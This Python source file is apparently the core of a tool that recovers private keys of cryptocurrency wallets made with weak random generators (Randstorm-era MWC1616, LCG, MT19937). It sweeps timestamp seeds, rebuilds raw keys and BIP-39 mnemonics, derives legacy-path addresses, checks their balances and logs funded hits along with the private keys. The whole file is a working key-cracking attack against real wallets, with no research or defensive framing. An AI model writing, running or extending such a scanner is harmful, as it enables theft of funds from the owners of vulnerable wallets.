"""Scan Engine (V5) — search-space orchestration over weak PRNG simulators.

Pipeline per candidate:

    time window ──> RNG simulator ──> entropy buffer ──┬─> raw privkey (JSBN era)
                  (MWC1616 / LCG / MT19937)            └─> BIP-39 mnemonic ──> seed
                                                                        │
                                            legacy path families  ──────┤
                                     (electrum_v1, bitcoincore_old,     ▼
                                      blockchain_info, multibit, ...)  addresses
                                                                        │
                                             bloom pre-screen ──────────▼
                                                read-only balance check

Design notes
  * The Randstorm-era JSBN/BitcoinJS wallets consumed Math.random() bytes
    directly as the 256-bit EC private key (`new BN(random)` reduced mod n),
    so `mode="direct"` is the primary sweep; `mode="bip39"` covers wallets
    that fed the same weak stream into a 16-byte entropy buffer.
  * Vectorized lanes (numpy) generate thousands of independent MWC1616
    states in lock-step; address derivation stays scalar (pure-python ecc).
  * Everything is stoppable mid-scan; progress + hits are exposed for the
    CLI and the browser GUI alike.
"""
from __future__ import annotations

import dataclasses
import threading
import time
from dataclasses import dataclass, field
from typing import Dict, Iterable, List, Optional, Tuple

import numpy as np

import bip39
import hd
import lcg
import mwc1616
from balance import BalanceChecker


# ---------------------------------------------------------------- findings
@dataclass
class Finding:
    kind: str                   # "direct" | "bip39"
    source: str                 # rng label e.g. "randstorm/mwc1616"
    t_ms: int                   # wall-clock guess that seeded the RNG
    priv_hex: str
    chain_tag: str
    address: str
    style: str                  # path family / "direct"
    path: str
    compressed: bool
    balance_sat: int
    tx_count: int
    backend: str
    mnemonic: Optional[str] = None      # only when kind == "bip39"
    found_at: float = field(default_factory=time.time)

    def public_dict(self) -> dict:
        """GUI-safe view — NEVER contains the private key or mnemonic."""
        d = dataclasses.asdict(self)
        d.pop("priv_hex", None)
        d.pop("mnemonic", None)
        return d


# ------------------------------------------------------------------ config
@dataclass
class ScanConfig:
    vuln: str = "randstorm"          # randstorm | lcg | mt19937
    mode: str = "direct"             # direct | bip39   (what entropy feeds)
    t_start_ms: int = 0              # inclusive, epoch ms
    t_stop_ms: int = 0               # exclusive, epoch ms
    stride_ms: int = 1               # sweep granularity for randstorm
    lcg_variant: str = "java"        # java | msvc_mod | msvc_top | nr
    lcg_seconds: bool = True         # seed = epoch SECONDS (LCG space small!)
    coins: Tuple[str, ...] = ("btc",)
    styles: Optional[Tuple[str, ...]] = None    # None => all legacy families
    naddr: int = 1                   # receiving+change addresses per family
    batch: int = 4096                # vectorized lanes per step
    max_candidates: int = 0          # 0 => unlimited
    stop_on_hit: bool = False
    partial_words: Optional[Tuple[int, ...]] = None   # gap positions (BIP-39)

    @staticmethod
    def from_years(y0: int, y1: int, **kw) -> "ScanConfig":
        a = int(time.mktime((y0, 1, 1, 0, 0, 0, 0, 0, -1)) * 1000)
        b = int(time.mktime((y1, 1, 1, 0, 0, 0, 0, 0, -1)) * 1000)
        return ScanConfig(t_start_ms=a, t_stop_ms=b, **kw)


# ------------------------------------------------------------------- stats
@dataclass
class ScanStats:
    started: float = 0.0
    elapsed: float = 0.0
    candidates: int = 0
    addresses_derived: int = 0
    bloom_skips: int = 0
    network_probes: int = 0
    hits: int = 0
    finished: bool = False
    stopped: bool = False

    def rate(self) -> float:
        e = max(self.elapsed, 1e-9)
        return self.candidates / e

    def eta_s(self, cfg: ScanConfig) -> Optional[float]:
        if cfg.t_stop_ms and self.started and self.candidates:
            frac = (self._done_ms(cfg) /
                    max(cfg.t_stop_ms - cfg.t_start_ms, 1))
            if 0 < frac < 1:
                return self.elapsed * (1 - frac) / frac
        return None

    def _done_ms(self, cfg: ScanConfig) -> int:
        if cfg.vuln == "randstorm":
            return min(self.candidates * cfg.stride_ms,
                       cfg.t_stop_ms - cfg.t_start_ms)
        return 0


# ------------------------------------------------------------------ engine
class ScanEngine:
    def __init__(self, cfg: ScanConfig, checker: BalanceChecker):
        self.cfg = cfg
        self.checker = checker
        self.findings: List[Finding] = []
        self.stats = ScanStats()
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.on_hit = None                    # callback(Finding) — GUI hook
        self.on_progress = None               # callback(ScanStats)

    # -- control -----------------------------------------------------------
    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            raise RuntimeError("scan already running")
        self._stop.clear()
        self.stats = ScanStats(started=time.time())
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()

    @property
    def running(self) -> bool:
        return bool(self._thread and self._thread.is_alive())

    def join(self, timeout: Optional[float] = None) -> None:
        if self._thread:
            self._thread.join(timeout)

    # -- main loop ---------------------------------------------------------
    def _run(self) -> None:
        try:
            if self.cfg.vuln == "randstorm":
                self._sweep_randstorm()
            elif self.cfg.vuln == "lcg":
                self._sweep_lcg()
            elif self.cfg.vuln == "mt19937":
                self._sweep_mt()
            else:
                raise ValueError(f"unknown vuln {self.cfg.vuln!r}")
            self.stats.finished = not self.stats.stopped
        finally:
            self.stats.elapsed = time.time() - self.stats.started

    def _budget_ok(self) -> bool:
        c = self.cfg
        if self._stop.is_set():
            self.stats.stopped = True
            return False
        if c.max_candidates and self.stats.candidates >= c.max_candidates:
            return False
        return True

    def _note_hit(self, f: Finding) -> None:
        self.findings.append(f)
        self.stats.hits += 1
        if self.on_hit:
            try:
                self.on_hit(f)
            except Exception:
                pass

    # -- Randstorm (V8 MWC1616) --------------------------------------------
    def _sweep_randstorm(self) -> None:
        c = self.cfg
        lanes = max(c.batch, 1)
        # Build lane seeds: consecutive ms timestamps mapped through the
        # canonical time-seeding helper (see mwc1616.v8_seeds_from_time_ms).
        t = c.t_start_ms
        while t < c.t_stop_ms and self._budget_ok():
            ts = [t + i * c.stride_ms for i in range(lanes)
                  if t + i * c.stride_ms < c.t_stop_ms]
            if not ts:
                break
            s1 = [v & 0xFFFFFFFF for v in ts]
            s2 = [((v >> 32) ^ (v * 2654435761)) & 0xFFFFFFFF for v in ts]
            batch = mwc1616.V8Batch(s1, s2)
            # one chunk per lane -> 31 bits; need 256 bits => 9 chunks
            words = np.stack([batch.step() for _ in range(9)], axis=1)
            rows = self._words_to_buffers(words)
            for lane_i, buf in enumerate(rows):
                self.stats.candidates += 1
                tm = ts[lane_i]
                if c.mode == "direct":
                    self._probe_direct(buf, tm, "randstorm/mwc1616")
                else:
                    self._probe_bip39(buf, tm, "randstorm/mwc1616")
            if self.on_progress:
                self.stats.elapsed = time.time() - self.stats.started
                self.on_progress(self.stats)
            t += lanes * c.stride_ms

    @staticmethod
    def _words_to_buffers(words: "np.ndarray") -> List[bytes]:
        """(lanes, 9) uint32 chunks -> list of 32-byte big-endian buffers.

        Concatenate 9×31-bit chunks = 279 bits, keep top 256 → JSBN-style
        `new BN(bytes)` then reduced mod n by caller semantics.
        """
        out = []
        for row in words.astype(np.uint64):
            acc = 0
            for w in row:
                acc = (acc << 31) | int(w)
            acc >>= (9 * 31 - 256)                     # trim to 256 bits
            out.append(acc.to_bytes(32, "big"))
        return out

    # -- LCG sweeps ----------------------------------------------------------
    def _sweep_lcg(self) -> None:
        c = self.cfg
        t0 = c.t_start_ms // 1000 if c.lcg_seconds else c.t_start_ms
        t1 = c.t_stop_ms // 1000 if c.lcg_seconds else c.t_stop_ms
        t = t0
        while t < t1 and self._budget_ok():
            for buf in lcg.time_seed_lcg(t, c.lcg_variant):
                self.stats.candidates += 1
                src = f"lcg/{c.lcg_variant}"
                if c.mode == "direct":
                    self._probe_direct(buf, t * 1000, src)
                else:
                    self._probe_bip39(buf, t * 1000, src)
            t += 1
            if t % 3600 == 0 and self.on_progress:
                self.stats.elapsed = time.time() - self.stats.started
                self.on_progress(self.stats)

    # -- MT19937 sweeps -------------------------------------------------------
    def _sweep_mt(self) -> None:
        import mt19937
        c = self.cfg
        t0 = c.t_start_ms // 1000
        t1 = c.t_stop_ms // 1000
        for sec in range(t0, t1):
            if not self._budget_ok():
                break
            # historical vulnerable path: one rng() call PER BYTE (low byte of
            # each tempered output) — exactly ref_entropy_buffer's semantics.
            buf = mt19937.ref_entropy_buffer(sec & 0xFFFFFFFF)
            self.stats.candidates += 1
            if c.mode == "direct":
                self._probe_direct(buf, sec * 1000, "mt19937/std")
            else:
                self._probe_bip39(buf, sec * 1000, "mt19937/std")

    # -- probing --------------------------------------------------------------
    def _probe_direct(self, entropy: bytes, t_ms: int, src: str) -> None:
        """Raw-key era: JSBN took random bytes -> BN -> privkey (mod n)."""
        import ecc
        k = int.from_bytes(entropy, "big")
        if k == 0:
            return
        k %= ecc.CURVE_ORDER
        priv = k.to_bytes(32, "big")
        keys = hd.direct_keys(priv, self.cfg.coins)
        self._check_keys(keys, Finding(kind="direct", source=src, t_ms=t_ms,
                                       priv_hex=priv.hex(), chain_tag="",
                                       address="", style="direct", path="-",
                                       compressed=True, balance_sat=0,
                                       tx_count=0, backend=""))

    def _probe_bip39(self, entropy: bytes, t_ms: int, src: str) -> None:
        """Mnemonic era: first 16 bytes -> 12-word phrase -> legacy paths."""
        keys = hd.derive_keys_from_entropy(entropy, self.cfg.coins,
                                           self.cfg.styles, self.cfg.naddr)
        base = Finding(kind="bip39", source=src, t_ms=t_ms, priv_hex="",
                       chain_tag="", address="", style="", path="",
                       compressed=True, balance_sat=0, tx_count=0, backend="",
                       mnemonic=bip39.entropy_to_mnemonic(entropy[:16]))
        self._check_keys(keys, base)

    def _check_keys(self, keys: List[hd.DerivedKey], base: Finding) -> None:
        self.stats.addresses_derived += len(keys)
        pairs = [(k.chain_tag, k.address) for k in keys]
        res_list = self.checker.check_many(pairs)
        hit_addrs = {r.address: r for r in res_list}
        for k in keys:
            r = hit_addrs.get(k.address)
            if r is None:
                continue
            f = dataclasses.replace(base, chain_tag=k.chain_tag,
                                    address=k.address, style=k.style,
                                    path=k.path, compressed=k.compressed,
                                    priv_hex=k.priv_hex or base.priv_hex,
                                    balance_sat=r.confirmed,
                                    tx_count=r.tx_count, backend=r.source)
            self._note_hit(f)
            if self.cfg.stop_on_hit:
                self.stop()
        self.stats.bloom_skips = self.checker.skipped_by_bloom
        self.stats.network_probes = self.checker.probed
